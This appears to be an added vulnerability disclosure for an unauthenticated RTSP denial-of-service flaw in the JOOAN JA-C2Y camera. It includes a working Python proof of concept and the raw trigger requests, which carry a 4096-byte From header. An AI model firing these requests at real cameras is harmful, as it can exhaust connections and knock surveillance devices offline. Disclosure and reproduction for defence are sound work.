@@ -1,0 +1,207 @@
+# JOOAN JA-C2Y - Unauthenticated RTSP Resource Exhaustion via Oversized Non-Seed Header
+
+### Information
+
+Vendor: Shenzhen Jooan Technology Co., Ltd. (JOOAN / 乔安)
+
+Affected Product: JOOAN JA-C2Y network camera
+
+Affected Firmware Version: 05.02.32.19
+
+Vendor Homepage: [https://www.jooancam.com](https://www.jooancam.com)
+
+Vendor Contact Information: [support@jooancam.com](mailto:support@jooancam.com) / +1 (800) 678-9326 (JOOAN Contact Support: https://www.jooancam.com/support/contact)
+
+![Vendor contact information](images/00_vendor_contact.png)
+
+Affected Component: RTSP service (TCP/554)
+
+### Description
+
+A vulnerability in the RTSP service of JOOAN JA-C2Y firmware 05.02.32.19 allows an unauthenticated attacker to consume RTSP connection resources. A crafted request with an oversized value in a non-seed header is accepted but receives no RTSP response, and the connection remains open. The behavior was reproduced with multiple non-seed headers on OPTIONS and DESCRIBE; repeated or concurrent requests may cause a denial of service.
+
+### Exploit Demo
+
+The tested deployment does not require RTSP authentication. The PoC sends a normal `OPTIONS` request, which returns `200 OK`, and then sends an `OPTIONS` request with a 4096-byte value in the non-seed `From` header. The malformed request receives no RTSP response within the 30-second observation window.
+
+The terminal output shows the baseline `200 OK`, the trigger request, and the 30-second timeout:
+
+![PoC terminal output](./images/01_poc_terminal.png)
+
+Wireshark shows the trigger request and the absence of a response; the malformed connection remains open:
+
+![Wireshark packet list](./images/02_wireshark_packet_list.png)
+
+Wireshark `Follow TCP Stream` shows the complete trigger request:
+
+![Wireshark TCP stream](./images/03_wireshark_tcp_stream.png)
+
+The same behavior was reproduced with 11 representative non-seed headers: `From`, `Accept-Language`, `Require`, `Content-Language`, `Via`, `Accept-Encoding`, `Referer` and `Public` on `OPTIONS`, and `x-sessioncookie`, `DataConvertBuffer` and `If-Modified-Since` on `DESCRIBE`. All used a 4096-byte value and produced the same timeout; short-value controls returned `200 OK`. The PoC uses `From` on `OPTIONS` as the representative trigger.
+
+Each malformed request leaves an RTSP connection open without a response. Repeated or concurrent malformed requests can accumulate and may exhaust RTSP connection resources, potentially causing a denial of service.
+
+A 51-second screen recording of the full reproduction is provided as [04_reproduction_video.mp4](./images/04_reproduction_video.mp4). It shows the baseline OPTIONS, the 4096-byte `From` header trigger, and the 30-second timeout.
+
+### POC
+
+The following standalone Python 3 PoC reproduces the representative trigger. Replace `TARGET_IP`, `USERNAME` and `PASSWORD` with the test device values. This trigger does not require authentication; the credential placeholders are retained for consistency. The trigger is defined explicitly in the code.
+
+```python
+#!/usr/bin/env python3
+"""JOOAN JA-C2Y oversized non-seed header RTSP PoC.
+
+Hardcoded target: 192.168.1.100:554 (placeholder).
+The script sends a normal OPTIONS request, then an OPTIONS request with a
+4096-byte value in the non-seed "From" header. The malformed request receives
+no RTSP response.
+Run this file directly from VS Code.
+"""
+
+import socket
+import time
+
+TARGET_IP = "192.168.1.100"  # replace with the target camera IP
+TARGET_PORT = 554
+
+# Not required for this unauthenticated trigger.
+USERNAME = "REDACTED"  # replace with the account username
+PASSWORD = "REDACTED"  # replace with the account password
+
+REQUEST_INTERVAL = 1.0
+RESPONSE_WAIT = 30.0
+USER_AGENT = "JA-C2Y-LongHeader-timeout-check/1.0"
+
+BASE = "rtsp://%s:%d/live/ch00_0" % (TARGET_IP, TARGET_PORT)
+
+# Request 1: normal OPTIONS.
+BASELINE_OPTIONS = (
+    f"OPTIONS {BASE} RTSP/1.0\r\n"
+    "CSeq: 2\r\n"
+    f"User-Agent: {USER_AGENT}\r\n\r\n"
+)
+
+# Request 2: the trigger. "From" is not part of the normal seed.
+TRIGGER_HEADER = "From: " + ("A" * 4096)
+TRIGGER_REQUEST = (
+    f"OPTIONS {BASE} RTSP/1.0\r\n"
+    f"{TRIGGER_HEADER}\r\n"
+    "CSeq: 3\r\n"
+    f"User-Agent: {USER_AGENT}\r\n\r\n"
+)
+
+
+def show_payload(payload):
+    text = payload.decode("latin-1")
+    print("  send:")
+    for line in text.rstrip("\r\n").split("\r\n"):
+        if line.startswith("From: "):
+            value = line[len("From: "):]
+            line = "From: " + value[:32] + "... [%d-byte value]" % len(value)
+        elif len(line) > 120:
+            line = line[:90] + "... [%d bytes total]" % len(line)
+        print("    | " + line)
+
+
+def read_status(stream):
+    status = stream.readline()
+    if not status:
+        return None
+    if not status.startswith(b"RTSP/1.0 "):
+        return "unexpected status line"
+    headers = []
+    while True:
+        line = stream.readline()
+        if not line:
+            return None
+        if line in (b"\r\n", b"\n"):
+            break
+        headers.append(line.decode("latin-1").rstrip("\r\n"))
+    for line in headers:
+        if line.lower().startswith("content-length:"):
+            length = int(line.split(":", 1)[1].strip())
+            remaining = length
+            while remaining:
+                chunk = stream.read(remaining)
+                if not chunk:
+                    break
+                remaining -= len(chunk)
+            break
+    return status.decode("latin-1").strip()
+
+
+def send_and_read(sock, stream, label, payload, timeout):
+    if isinstance(payload, str):
+        payload = payload.encode("latin-1")
+    print("\n[%s]" % label)
+    show_payload(payload)
+    time.sleep(REQUEST_INTERVAL)
+    try:
+        sock.sendall(payload)
+        sock.settimeout(timeout)
+        status = read_status(stream)
+    except socket.timeout:
+        print("  -> TIMEOUT: no RTSP response within %.1fs" % timeout)
+        return None
+    except (OSError, ValueError) as exc:
+        print("  -> %s: %s" % (type(exc).__name__, exc))
+        return None
+    print("  <- %s" % (status or "connection closed"))
+    return status
+
+
+def main():
+    print("=" * 70)
+    print("JOOAN JA-C2Y oversized non-seed header RTSP PoC")
+    print("  target: %s:%d" % (TARGET_IP, TARGET_PORT))
+    print("  trigger: OPTIONS with a 4096-byte From header")
+    print("=" * 70)
+
+    sock = socket.create_connection((TARGET_IP, TARGET_PORT), timeout=5)
+    stream = sock.makefile("rb")
+    try:
+        status = send_and_read(
+            sock, stream, "[1/2] Baseline OPTIONS", BASELINE_OPTIONS, 5.0)
+        if not status or not status.startswith("RTSP/1.0 200"):
+            print("Baseline OPTIONS did not return 200; aborting.")
+            return
+
+        print("\n" + "=" * 70)
+        print(">>> TRIGGER: [2/2] OPTIONS with 4096-byte From header <<<")
+        print(">>> This is the request that hangs the RTSP session. <<<")
+        print("=" * 70)
+        send_and_read(
+            sock, stream, "[2/2] TRIGGER OPTIONS", TRIGGER_REQUEST, RESPONSE_WAIT)
+    finally:
+        try:
+            stream.close()
+        except OSError:
+            pass
+        try:
+            sock.close()
+        except OSError:
+            pass
+
+
+if __name__ == "__main__":
+    main()
+
+```
+
+### MSG
+
+The complete representative trigger is shown below. `192.168.1.100` is a placeholder for the target address. All request lines use CRLF.
+
+```text
+OPTIONS rtsp://192.168.1.100:554/live/ch00_0 RTSP/1.0
+CSeq: 2
+User-Agent: JA-C2Y-LongHeader-timeout-check/1.0
+
+OPTIONS rtsp://192.168.1.100:554/live/ch00_0 RTSP/1.0
+From: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+CSeq: 3
+User-Agent: JA-C2Y-LongHeader-timeout-check/1.0
+```
+
+### Credit
+
+CRfuzzer
